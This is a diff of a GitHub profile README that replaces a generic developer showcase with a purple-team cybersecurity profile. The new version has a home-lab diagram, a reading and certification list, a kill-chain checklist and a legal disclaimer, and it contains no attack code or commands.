-    method: "Hands-on Labs",
-    mindset: "Never Stop Learning"
-}
-```
-
-**🔥 SPECIALIZATION:**
-- 🛡️ **Core Focus Areas**
-  - Cybersecurity operations
-  - System administration
-  - Network operations
-  - Security analysis
-- 🧪 **Learning Approach**
-  - Lab-driven methodology
-  - Practical over theory
-  - Break it, fix it, learn
-- 🧠 **Mindset**
-  - Analytical thinking
-  - Problem-solving oriented
-  - Detail obsessed
-  - Continuous learner
-
-**⚡ POWER LEVEL:** ████████░░ 88%
-
-</td>
-</tr>
-</table>
+## 🔥 HOME LAB INFRASTRUCTURE
 
 <div align="center">
 
-### 🎖️ **SKILL MASTERY OVERVIEW** 🎖️
+<img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExcjBqaDl3YnRrNjZidjhvaWI0c3BmaW9nYzEzZWcyZDJkdDRtZjQxZSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/xT77XWum9yH7zNkFW0/giphy.gif" width="400">
 
-<img src="https://user-images.githubusercontent.com/74038190/212257472-08e52665-c503-4bd9-aa20-f5a4dae769b5.gif" width="100">
+*"This is my lab... There are many like it, but this one is mine! 🔥"*
 
-| 🏆 Category | 💪 Level | 📊 Progress | ⭐ Highlight |
-|-------------|----------|-------------|--------------|
-| **🐧 Linux Administration** | Expert | ████████░░ 85% | Kali Linux Specialist |
-| **🌐 Networking** | Advanced | ████████░░ 80% | pfSense Pro |
-| **🔐 Cybersecurity** | Advanced | ████████░░ 90% | OWASP Expert |
-| **💻 Programming** | Intermediate | ███████░░░ 75% | Python Automation |
-| **🛠️ Tools & Practices** | Expert | ████████░░ 85% | CLI Ninja |
-| **🎯 Problem Solving** | Expert | █████████░ 88% | Root Cause Master |
+</div>
 
-<img src="https://skillicons.dev/icons?i=kali,linux,ubuntu,windows,python,bash,c,ruby,vim,git,docker,vscode&theme=dark" />
+```
+┌──────────────────────────────────────────────────────────────┐
+│              PURPLE TEAM HOME LAB SETUP                      │
+├──────────────────────────────────────────────────────────────┤
+│                                                              │
+│  🖥️  ATTACK LAB          │  🛡️  DEFENSE LAB                 │
+│  ├─ Kali Linux           │  ├─ pfSense Firewall             │
+│  ├─ Parrot OS            │  ├─ Security Onion (IDS/IPS)     │
+│  ├─ Metasploitable       │  ├─ Wazuh SIEM                   │
+│  └─ DVWA                 │  ├─ TheHive (SOAR)               │
+│                          │  └─ Splunk Enterprise            │
+│                                                              │
+│  🌐 NETWORK SEGMENTATION                                     │
+│  ├─ VLAN 10: Management (10.0.10.0/24)                      │
+│  ├─ VLAN 20: Attack Network (10.0.20.0/24)                  │
+│  ├─ VLAN 30: Victim Network (10.0.30.0/24)                  │
+│  └─ VLAN 40: Security Monitoring (10.0.40.0/24)             │
+│                                                              │
+└──────────────────────────────────────────────────────────────┘
+```
 
-### 🔥 **SECURITY TOOLBOX** 🔥
+### 🏗️ Infrastructure Components
+![Proxmox](https://img.shields.io/badge/Proxmox-E57000?style=for-the-badge&logo=proxmox&logoColor=white)
+![VMware](https://img.shields.io/badge/VMware-607078?style=for-the-badge&logo=vmware&logoColor=white)
+![pfSense](https://img.shields.io/badge/pfSense-212121?style=for-the-badge&logo=pfsense&logoColor=white)
+![Active Directory](https://img.shields.io/badge/Active_Directory-0078D4?style=for-the-badge&logo=microsoft&logoColor=white)
 
-**🎯 Reconnaissance**
-<br/>
-<img src="https://img.shields.io/badge/Nmap-0078D4?style=for-the-badge&logo=nmap&logoColor=white" />
-<img src="https://img.shields.io/badge/Wireshark-1679A7?style=for-the-badge&logo=wireshark&logoColor=white" />
-<img src="https://img.shields.io/badge/Metasploit-2596CD?style=for-the-badge&logo=metasploit&logoColor=white" />
-<img src="https://img.shields.io/badge/Burp_Suite-FF6633?style=for-the-badge&logo=burp-suite&logoColor=white" />
+---
 
-**⚔️ Exploitation & Testing**
-<br/>
-<img src="https://img.shields.io/badge/Aircrack--ng-00C244?style=for-the-badge" />
-<img src="https://img.shields.io/badge/John_The_Ripper-FF0000?style=for-the-badge" />
-<img src="https://img.shields.io/badge/Hydra-000000?style=for-the-badge" />
-<img src="https://img.shields.io/badge/SQLMap-CC0000?style=for-the-badge" />
+## 📚 CYBERSECURITY RESOURCES
 
-**🛡️ Defense & Analysis**
-<br/>
-<img src="https://img.shields.io/badge/pfSense-212121?style=for-the-badge&logo=pfsense&logoColor=white" />
-<img src="https://img.shields.io/badge/Snort-FF0000?style=for-the-badge" />
-<img src="https://img.shields.io/badge/OSSEC-00ADD8?style=for-the-badge" />
-<img src="https://img.shields.io/badge/Fail2Ban-000000?style=for-the-badge" />
+### 📖 Essential Reading
+- 🔴 **Red Team Development and Operations** - Joe Vest & James Tubberville
+- 🔵 **Blue Team Handbook: Incident Response Edition** - Don Murdoch
+- 🟣 **Purple Team Strategies** - Tim Bryant & Brian Johnson  
+- 🎯 **The Hacker Playbook 3** - Peter Kim
+- 🛡️ **Defensive Security Handbook** - Amanda Berlin & Lee Brotherston
+
+### 🎓 Training & Certifications
+- **OSCP** - Offensive Security Certified Professional
+- **OSEP** - Offensive Security Experienced Penetration Tester
+- **GPEN** - GIAC Penetration Tester
+- **GCIH** - GIAC Certified Incident Handler
+- **GCIA** - GIAC Certified Intrusion Analyst
+
+---
+
+## 📊 THREAT INTELLIGENCE STATS
+
+<div align="center">
+
+<img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExazY3bjg1YXVzM2VvdTJ5Nmg1bWZvcG5tNGJvdjExNTc3aG9zOHJ2cSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3oKIPEqDGUULpEU0aQ/giphy.gif" width="400">
+
+*"Numbers don't lie... but hackers do! 📊"*
+
+</div>
+
+```
+╔══════════════════════════════════════════════════════════════╗
+║          CYBERSECURITY OPERATIONS METRICS                    ║
+╠══════════════════════════════════════════════════════════════╣
+║                                                              ║
+║  🎯 ATTACK SIMULATIONS:    [████████████] 150+ Scenarios    ║
+║  🔍 THREATS DETECTED:      [██████████--] 89% Success Rate  ║
+║  🛡️ SYSTEMS HARDENED:      [████████████] 200+ Endpoints    ║
+║  📝 IOCs DOCUMENTED:       [██████████--] 500+ Indicators   ║
+║  ⚡ MEAN TIME TO DETECT:   [████--------]  < 5 Minutes      ║
+║  🔥 MEAN TIME TO RESPOND:  [██████------]  < 15 Minutes     ║
+║                                                              ║
+╚══════════════════════════════════════════════════════════════╝
+```
+
+![GitHub Stats](https://github-readme-stats.vercel.app/api?username=antrara&show_icons=true&theme=midnight-purple&hide_border=true&bg_color=0D1117&title_color=9333EA&icon_color=9333EA&text_color=FFFFFF)
+
+![GitHub Streak](https://github-readme-streak-stats.herokuapp.com/?user=antrara&theme=midnight-purple&hide_border=true&background=0D1117&ring=9333EA&fire=C026D3&currStreakLabel=9333EA)
+
+![Top Languages](https://github-readme-stats.vercel.app/api/top-langs/?username=antrara&layout=compact&theme=midnight-purple&hide_border=true&bg_color=0D1117&title_color=9333EA&text_color=FFFFFF)
 
 </div>
 
 ---
 
-<img src="https://user-images.githubusercontent.com/74038190/212284115-f47cd8ff-2ffb-4b04-b5bf-4d1c14c0247f.gif" width="1000">
+## 🏆 ACHIEVEMENTS & KILL CHAIN
 
 <div align="center">
 
-## ⚡ **TECH ARSENAL** ⚡
+<img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExcWs3dXVzOHk1Z2kzNDF4NnNucTE2aDZtdTc1YWt4Z211M3hvMWEwbCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/g9582DNuQppxC/giphy.gif" width="400">
 
-<img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Animated-Fluent-Emojis/master/Emojis/Objects/Crossed%20Swords.png" alt="Swords" width="100" />
+*"Achievement Unlocked: Elite Hacker Status! 🏆"*
 
-<img src="https://i.imgur.com/dBaSKWF.gif" height="20" width="100%">
-
-### 🔥 **LANGUAGES** 🔥
-
-<img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Animated-Fluent-Emojis/master/Emojis/Travel%20and%20places/Fire.png" alt="Fire" width="25" /> <img src="https://skillicons.dev/icons?i=c,cpp,cs,python,rust,php,kotlin,bash,java,go,typescript,javascript&perline=12&theme=dark" /> <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Animated-Fluent-Emojis/master/Emojis/Travel%20and%20places/Fire.png" alt="Fire" width="25" />
-
-<img src="https://github-readme-stats.vercel.app/api/top-langs/?username=antrara&layout=donut&theme=radical&hide_border=true&bg_color=0D1117&title_color=FF6D00&text_color=FFFFFF&langs_count=12" />
-
-<img src="https://i.imgur.com/dBaSKWF.gif" height="20" width="100%">
-
-### 💻 **FRONTEND MASTERY** 💻
-
-<img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Animated-Fluent-Emojis/master/Emojis/Objects/Desktop%20Computer.png" alt="Computer" width="25" /> <img src="https://skillicons.dev/icons?i=react,nextjs,vue,angular,svelte,tailwind,bootstrap,sass,html,css,webpack,vite&perline=12&theme=dark" /> <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Animated-Fluent-Emojis/master/Emojis/Objects/Desktop%20Computer.png" alt="Computer" width="25" />
-
-<img src="https://i.imgur.com/dBaSKWF.gif" height="20" width="100%">
-
-### 🧪 **TESTING & QA ARSENAL** 🧪
-
-<img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Animated-Fluent-Emojis/master/Emojis/Objects/Test%20Tube.png" alt="Test" width="25" /> <img src="https://skillicons.dev/icons?i=cypress,jest,selenium&theme=dark" />
-<img src="https://img.shields.io/badge/Mocha-8D6748?style=for-the-badge&logo=mocha&logoColor=white" />
-<img src="https://img.shields.io/badge/Postman-FF6C37?style=for-the-badge&logo=postman&logoColor=white" />
-<img src="https://img.shields.io/badge/Testing_Library-E33332?style=for-the-badge&logo=testing-library&logoColor=white" />
-<img src="https://img.shields.io/badge/Playwright-2EAD33?style=for-the-badge&logo=playwright&logoColor=white" /> <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Animated-Fluent-Emojis/master/Emojis/Objects/Test%20Tube.png" alt="Test" width="25" />
-
-<img src="https://i.imgur.com/dBaSKWF.gif" height="20" width="100%">
-
-### 🔧 **DEVOPS & CLOUD** 🔧
-
-<img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Animated-Fluent-Emojis/master/Emojis/Objects/Gear.png" alt="Gear" width="25" /> <img src="https://skillicons.dev/icons?i=docker,kubernetes,jenkins,gitlab,github,githubactions,terraform,ansible,prometheus,grafana,nginx,linux&perline=12&theme=dark" /> <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Animated-Fluent-Emojis/master/Emojis/Objects/Gear.png" alt="Gear" width="25" />
-
-<img src="https://i.imgur.com/dBaSKWF.gif" height="20" width="100%">
-
-### ☁️ **CLOUD PLATFORMS** ☁️
-
-<img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Animated-Fluent-Emojis/master/Emojis/Travel%20and%20places/Cloud.png" alt="Cloud" width="25" /> <img src="https://skillicons.dev/icons?i=aws,azure,gcp,heroku,vercel,netlify,cloudflare,digitalocean&perline=8&theme=dark" /> <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Animated-Fluent-Emojis/master/Emojis/Travel%20and%20places/Cloud.png" alt="Cloud" width="25" />
-
-<img src="https://i.imgur.com/dBaSKWF.gif" height="20" width="100%">
-
-### 🗄️ **DATABASES & STORAGE** 🗄️
-
-<img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Animated-Fluent-Emojis/master/Emojis/Objects/Card%20File%20Box.png" alt="Database" width="25" /> <img src="https://skillicons.dev/icons?i=postgres,mysql,mongodb,redis,sqlite,cassandra&perline=6&theme=dark" />
-<img src="https://img.shields.io/badge/Microsoft_SQL_Server-CC2927?style=for-the-badge&logo=microsoft-sql-server&logoColor=white" />
-<img src="https://img.shields.io/badge/Oracle-F80000?style=for-the-badge&logo=oracle&logoColor=white" />
-<img src="https://img.shields.io/badge/Elasticsearch-005571?style=for-the-badge&logo=elasticsearch&logoColor=white" /> <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Animated-Fluent-Emojis/master/Emojis/Objects/Card%20File%20Box.png" alt="Database" width="25" />
-
-<img src="https://i.imgur.com/dBaSKWF.gif" height="20" width="100%">
-
-### 🛠️ **TOOLS & UTILITIES** 🛠️
-
-<img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Animated-Fluent-Emojis/master/Emojis/Objects/Hammer%20and%20Wrench.png" alt="Tools" width="25" /> <img src="https://skillicons.dev/icons?i=vscode,idea,vim,git,arduino,raspberrypi,postman,figma&perline=8&theme=dark" /> <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Animated-Fluent-Emojis/master/Emojis/Objects/Hammer%20and%20Wrench.png" alt="Tools" width="25" />
+![Trophy](https://github-profile-trophy.vercel.app/?username=antrara&theme=darkhub&no-frame=true&no-bg=true&row=1&column=7&title=MultiLanguage,Commits,PullRequest,Issues,Repositories,Stars,Followers)
 
 </div>
-
----
-
-<img src="https://i.imgur.com/dBaSKWF.gif" height="20" width="100%">
-
-<div align="center">
-
-## 📊 **GITHUB STATS ON FIRE** 🔥
-
-<img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Animated-Fluent-Emojis/master/Emojis/Travel%20and%20places/Fire.png" alt="Fire" width="100" />
-
-<img src="https://i.imgur.com/dBaSKWF.gif" height="20" width="100%">
-
-<img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Animated-Fluent-Emojis/master/Emojis/Objects/Chart%20Increasing.png" alt="Chart" width="40" /> <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Animated-Fluent-Emojis/master/Emojis/Travel%20and%20places/Glowing%20Star.png" alt="Star" width="40" /> <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Animated-Fluent-Emojis/master/Emojis/Travel%20and%20places/High%20Voltage.png" alt="Lightning" width="40" />
-
-<img width="49%" src="https://github-readme-stats.vercel.app/api?username=antrara&show_icons=true&theme=radical&hide_border=true&bg_color=0D1117&title_color=FF6D00&icon_color=00D9FF&text_color=FFFFFF&include_all_commits=true&count_private=true&rank_icon=percentile" />
-<img width="49%" src="https://github-readme-streak-stats.herokuapp.com/?user=antrara&theme=radical&hide_border=true&background=0D1117&stroke=FF6D00&ring=FF6D00&fire=FF6D00&currStreakLabel=00D9FF&sideLabels=00D9FF&dates=FFFFFF" />
-
-<img width="49%" src="https://github-readme-stats.vercel.app/api/top-langs/?username=antrara&layout=compact&theme=radical&hide_border=true&bg_color=0D1117&title_color=FF6D00&text_color=FFFFFF&langs_count=12" />
-<img width="49%" src="https://github-readme-activity-graph.vercel.app/graph?username=antrara&custom_title=📈%20Contribution%20Graph&bg_color=0D1117&color=FF6D00&line=00D9FF&point=FFFFFF&area=true&hide_border=true&area_color=00D9FF" />
-
-<img src="https://i.imgur.com/dBaSKWF.gif" height="20" width="100%">
-
-### 📈 **DETAILED ANALYTICS** 📈
-
-<img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Animated-Fluent-Emojis/master/Emojis/Objects/Bar%20Chart.png" alt="Bar Chart" width="60" />
-
-<img src="https://github-profile-summary-cards.vercel.app/api/cards/profile-details?username=antrara&theme=radical" width="100%" />
-
-<img width="32%" src="https://github-profile-summary-cards.vercel.app/api/cards/repos-per-language?username=antrara&theme=radical" />
-<img width="32%" src="https://github-profile-summary-cards.vercel.app/api/cards/most-commit-language?username=antrara&theme=radical" />
-<img width="32%" src="https://github-profile-summary-cards.vercel.app/api/cards/productive-time?username=antrara&theme=radical" />
-
-<img src="https://i.imgur.com/dBaSKWF.gif" height="20" width="100%">
-
-<img src="https://github-readme-stats.vercel.app/api/wakatime?username=antrara&theme=radical&hide_border=true&bg_color=0D1117&title_color=FF6D00&text_color=FFFFFF&layout=compact" width="49%" />
-<img src="https://github-readme-stats.vercel.app/api/pin/?username=antrara&repo=antrara&theme=radical&hide_border=true&bg_color=0D1117&title_color=FF6D00&text_color=FFFFFF&icon_color=00D9FF" width="49%" />
-
-</div>
-
----
-
-<img src="https://i.imgur.com/dBaSKWF.gif" height="20" width="100%">
-
-<div align="center">
-
-## 🏆 **TROPHY COLLECTION** 🏆
-
-<img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Animated-Fluent-Emojis/master/Emojis/Activities/Trophy.png" alt="Trophy" width="100" />
-
-<img src="https://github-profile-trophy.vercel.app/?username=antrara&theme=radical&no-frame=true&no-bg=false&margin-w=15&margin-h=15&row=2&column=6" width="100%" />
-
-<img src="https://i.imgur.com/dBaSKWF.gif" height="20" width="100%">
-
-### 🎖️ **ACHIEVEMENTS** 🎖️
-
-<img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Animated-Fluent-Emojis/master/Emojis/Activities/Medal.png" alt="Medal" width="60" />
-
-[![@antrara's Holopin board](https://holopin.me/antrara)](https://holopin.io/@antrara)
-
-</div>
-
----
-
-<img src="https://i.imgur.com/dBaSKWF.gif" height="20" width="100%">
-
-<div align="center">
-
-## 🎯 **CURRENT MISSIONS** 🎯
-
-<img src="https://user-images.githubusercontent.com/74038190/212257454-16e3712e-945a-4ca2-b238-408ad0bf87e6.gif" width="100">
-
-| 🏠 **HOME LAB** | 🔐 **SECURITY** | 🤖 **AUTOMATION** | 🌐 **OPEN SOURCE** |
-|-----------------|-----------------|-------------------|---------------------|
-| <img src="https://user-images.githubusercontent.com/74038190/212257465-7ce8d493-cac5-494e-982a-5a9deb852c4b.gif" width="100"> | <img src="https://user-images.githubusercontent.com/74038190/212257468-1e9a91f1-b626-4baa-b15d-5c385dfa7ed2.gif" width="100"> | <img src="https://user-images.githubusercontent.com/74038190/212257460-738ff738-247f-4445-a718-cdd0ca76e2db.gif" width="100"> | <img src="https://user-images.githubusercontent.com/74038190/212257463-4d082cb4-7483-4eaf-bc25-6dde2628aabd.gif" width="100"> |
-| Building enterprise infrastructure at home | Exploring ethical hacking & CTFs | Automating ALL the things | Contributing to awesome projects |
-| **Docker • Kubernetes • Proxmox** | **Kali • Metasploit • Burp Suite** | **CI/CD • Testing • Deployment** | **Python • Rust • Go** |
-
-</div>
-
----
-
-<img src="https://user-images.githubusercontent.com/74038190/212284115-f47cd8ff-2ffb-4b04-b5bf-4d1c14c0247f.gif" width="1000">
-
-<div align="center">
-
-## 🐍 **CONTRIBUTION SNAKE EATING MY COMMITS** 🐍
-
-<img src="https://raw.githubusercontent.com/platane/snk/output/github-contribution-grid-snake-dark.svg" alt="Snake animation" />
-
-### 📅 **CONTRIBUTION CALENDAR** 📅
-
-<img src="https://ghchart.rshah.org/FF6D00/antrara" alt="GitHub Contribution Chart" width="100%" />
-
-</div>
-
----
-
-<img src="https://user-images.githubusercontent.com/74038190/212284115-f47cd8ff-2ffb-4b04-b5bf-4d1c14c0247f.gif" width="1000">
-
-<div align="center">
-
-## 💬 **RANDOM DEV WISDOM** 💬
-
-<img src="https://quotes-github-readme.vercel.app/api?type=horizontal&theme=radical&border=true" />
-
-### 😂 **CODING MEMES** 😂
-
-<img src="https://readme-jokes.vercel.app/api?theme=radical&hideBorder" alt="Jokes Card" />
-
-</div>
-
----
-
-<img src="https://user-images.githubusercontent.com/74038190/212284115-f47cd8ff-2ffb-4b04-b5bf-4d1c14c0247f.gif" width="1000">
-
-<div align="center">
-
-## 🎵 **CURRENTLY VIBING TO** 🎵
-
-<img src="https://spotify-github-profile.vercel.app/api/view?uid=YOUR_SPOTIFY_ID&cover_image=true&theme=novatorem&show_offline=true&background_color=0d1117&interchange=false&bar_color=00d9ff&bar_color_cover=true" />
-
-</div>
-
----
-
-<img src="https://user-images.githubusercontent.com/74038190/212284115-f47cd8ff-2ffb-4b04-b5bf-4d1c14c0247f.gif" width="1000">
-
-<div align="center">
-
-## 🤝 **LET'S CONNECT** 🤝
-
-<img src="https://user-images.githubusercontent.com/74038190/212284136-03988914-d899-44b4-b1d9-4eeccf656e44.gif" width="150">
-
-<a href="https://twitter.com/yourusername">
-  <img src="https://img.shields.io/badge/Twitter-1DA1F2?style=for-the-badge&logo=twitter&logoColor=white&style=plastic&logo=twitter&logoColor=white" height="40" />
-</a>
-<a href="https://linkedin.com/in/yourusername">
-  <img src="https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" height="40" />
-</a>
-<a href="mailto:your.email@example.com">
-  <img src="https://img.shields.io/badge/Gmail-D14836?style=for-the-badge&logo=gmail&logoColor=white" height="40" />
-</a>
-<a href="https://discord.com/users/yourid">
-  <img src="https://img.shields.io/badge/Discord-7289DA?style=for-the-badge&logo=discord&logoColor=white" height="40" />
-</a>
-<a href="https://t.me/yourusername">
-  <img src="https://img.shields.io/badge/Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" height="40" />
-</a>
-<a href="https://instagram.com/yourusername">
-  <img src="https://img.shields.io/badge/Instagram-E4405F?style=for-the-badge&logo=instagram&logoColor=white" height="40" />
-</a>
-<a href="https://reddit.com/user/yourusername">
-  <img src="https://img.shields.io/badge/Reddit-FF4500?style=for-the-badge&logo=reddit&logoColor=white" height="40" />
-</a>
-<a href="https://stackoverflow.com/users/yourid">
-  <img src="https://img.shields.io/badge/Stack_Overflow-FE7A16?style=for-the-badge&logo=stack-overflow&logoColor=white" height="40" />
-</a>
-
-### 📧 **OR SHOOT ME AN EMAIL** 📧
 
 ```
-📬 your.email@example.com
-💼 Available for: Freelance | Collaboration | Interesting Projects
-⏰ Response Time: Usually within 24 hours ⚡
+┌─────────────────────────────────────────────────────────────┐
+│  CYBER KILL CHAIN ACHIEVEMENTS                              │
+├─────────────────────────────────────────────────────────────┤
+│  ✅ Reconnaissance          │  ✅ Privilege Escalation       │
+│  ✅ Weaponization           │  ✅ Defense Evasion            │
+│  ✅ Delivery                │  ✅ Credential Access          │
+│  ✅ Exploitation            │  ✅ Lateral Movement           │
+│  ✅ Installation            │  ✅ Collection                 │
+│  ✅ Command & Control       │  ✅ Exfiltration               │
+└─────────────────────────────────────────────────────────────┘
 ```
+
+---
+
+## 🤝 ALLIANCE NETWORK
+
+<div align="center">
+
+[![Twitter](https://img.shields.io/badge/Twitter-1DA1F2?style=for-the-badge&logo=twitter&logoColor=white)](https://twitter.com/antrara)
+[![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://linkedin.com/in/antrara)
+[![Discord](https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/antrara)
+[![Mastodon](https://img.shields.io/badge/Mastodon-6364FF?style=for-the-badge&logo=mastodon&logoColor=white)](https://infosec.exchange/@antrara)
 
 </div>
 
 ---
 
-<img src="https://user-images.githubusercontent.com/74038190/212284115-f47cd8ff-2ffb-4b04-b5bf-4d1c14c0247f.gif" width="1000">
+## ⚠️ DISCLAIMER
 
-<div align="center">
-
-## 💝 **SUPPORT MY WORK** 💝
-
-<img src="https://user-images.githubusercontent.com/74038190/216122003-0e5f2747-5c56-497f-9633-8431d4735c82.png" width="100" />
-
-If you like my work, consider buying me a coffee! ☕
-
-<a href="https://www.buymeacoffee.com/antrara">
-  <img src="https://img.shields.io/badge/Buy_Me_A_Coffee-FFDD00?style=for-the-badge&logo=buy-me-a-coffee&logoColor=black" height="50" />
-</a>
-<a href="https://ko-fi.com/antrara">
-  <img src="https://img.shields.io/badge/Ko--fi-FF5E5B?style=for-the-badge&logo=ko-fi&logoColor=white" height="50" />
-</a>
-<a href="https://paypal.me/antrara">
-  <img src="https://img.shields.io/badge/PayPal-00457C?style=for-the-badge&logo=paypal&logoColor=white" height="50" />
-</a>
-
-</div>
+```
+╔══════════════════════════════════════════════════════════════╗
+║                    LEGAL DISCLAIMER                          ║
+╠══════════════════════════════════════════════════════════════╣
+║                                                              ║
+║  All tools, techniques, and methodologies showcased here    ║
+║  are for EDUCATIONAL and AUTHORIZED TESTING purposes only.  ║
+║                                                              ║
+║  ⚠️  UNAUTHORIZED ACCESS TO COMPUTER SYSTEMS IS ILLEGAL     ║
+║                                                              ║
+║  Always obtain proper authorization before conducting       ║
+║  security assessments. Purple team operations should only   ║
+║  be performed in controlled environments with explicit      ║
+║  permission from system owners.                             ║
+║                                                              ║
+║  The author assumes no liability for misuse of this info.   ║
+║                                                              ║
+╚══════════════════════════════════════════════════════════════╝
+```
 
 ---
 
-<img src="https://user-images.githubusercontent.com/74038190/212284115-f47cd8ff-2ffb-4b04-b5bf-4d1c14c0247f.gif" width="1000">
-
 <div align="center">
 
-<img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=6,11,20&height=180&section=footer&text=THANKS%20FOR%20VISITING!&fontSize=42&fontColor=fff&animation=twinkling&fontAlignY=65" width="100%"/>
+<img src="https://i.imgur.com/dBaSKWF.gif" height="30" width="100%">
 
-### 🔥 **PROFILE STATS** 🔥
-
-![](https://hit.yhype.me/github/profile?user_id=121555436)
-
-<img src="https://profile-counter.glitch.me/antrara/count.svg" />
-
-### ⚡ **QUICK FACTS** ⚡
+<img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExcjhvN2htZTJrdjQyZXd6eHlrZGdkdWxydGN5dW5nYmNyY2RlYWI3bCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/LmNwrBhejkK9EFP504/giphy.gif" width="500">
 
 ```
-👨‍💻 Lines of Code Written: ∞
-☕ Cups of Coffee: Too Many to Count
-🐛 Bugs Fixed: More Than Created (Hopefully)
-🌙 Late Night Coding Sessions: YES
-🎯 Current Goal: Make the Internet Awesome
+┌─────────────────────────────────────────────────────────────┐
+│                                                             │
+│  "The best defense is knowing how to attack."              │
+│  "The best attack is understanding the defense."           │
+│                                                             │
+│                  - Purple Team Philosophy                   │
+│                                                             │
+│  "Believe in the exploit that believes in you!"  - Kamina  │
+│                                                             │
+└─────────────────────────────────────────────────────────────┘
 ```
 
-<img src="https://user-images.githubusercontent.com/74038190/212284158-e840e285-664b-44d7-b79b-e264b5e54825.gif" width="400">
+![Footer](https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=12,17,20,25,27&height=100&section=footer)
 
-**⭐️ From [antrara](https://github.com/antrara) with 💙 | Made with 🔥 and ☕**
+**⭐ Star this profile if you're a fellow Purple Team operator!**
 
-### 🌐 **VISITOR MAP** 🌐
+**🎌 Anime + Hacking = Ultimate Power! 🎌**
 
-<img src="https://api.visitorbadge.io/api/visitors?path=https%3A%2F%2Fgithub.com%2Fantrara&label=TOTAL%20VISITORS&labelColor=%23007EC6&countColor=%23263759&style=flat-square&labelStyle=upper" />
+```
+[MISSION STATUS: ACTIVE] | [THREAT LEVEL: CRITICAL] | [TEAM: PURPLE] | [POWER LEVEL: 9000+]
+```
 
----
-
-<img src="https://user-images.githubusercontent.com/74038190/212748830-4c709398-a386-4761-84d7-9e10b98fbe6e.gif" width="100%">
-
-**💡 TIP:** Star my repos if you find them useful! ⭐
-
-**🚀 FUN FACT:** This README is longer than most of my documentation 😅
-
-**🎮 ACHIEVEMENT UNLOCKED:** You read this far! You're awesome! 🏆
+*🟣 From [antrara](https://github.com/antrara) - Purple Team Operations Division | Cyber Ninja 忍者*
 
 </div>
